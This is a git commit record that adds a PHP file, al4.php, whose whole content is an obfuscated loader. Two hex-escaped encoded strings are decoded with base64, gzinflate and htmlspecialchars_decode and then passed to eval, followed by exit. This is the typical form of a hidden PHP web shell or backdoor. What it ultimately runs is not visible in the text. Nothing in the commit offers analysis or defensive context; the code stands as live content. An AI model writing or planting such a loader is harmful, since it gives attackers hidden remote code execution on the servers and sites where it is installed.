9a6c82111ed35ec801f9969e169d8c2614817a2d
karsim31 <karsim31121970@gmail.com>
2024-08-02 07:19:02 +0700

    Add files via upload

---
+++ al4.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3d4tfFwTW4d1S\x62EX3DzX\x619v6H0XfXH3sKKU693d\x42Mf3kZSy\x414szIU80\x63o79w9DDR75GY5pDWS\x43\x63JtGG7uGMw9ssPtGfQmRFQpv\x2bEKT9kWZtYtg\x2bjg\x2b6\x63L\x61NxQLF\x61pfE21k\x2bnI6\x62R9d7gtIpyUnGwSeYh74/43Nzpv\x619sgtfHi\x62NZ\x414tOf323Vpl748fhX\x43\x63IzNKFhwM3qLDDGD\x61Fm8n\x414fIxFhz\x63dilFh2L\x41kxFeWYvS1r5hkRIOvJ1ed6/1fY7\x2b\x41teFX\x2b4\x2bW\x62I2phh8yl5gyutQot\x61ZnDiLhJ\x41yQi\x2bL4Gw\x41MDvWTP33/q\x41Q1\x42wJe//\x42\x41gHw/\x61\x41Q5\x42wJe//\x41\x41wHw/K\x41Q9\x42wJe\x2b/f\x41\x41Eg/6HQ\x42\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
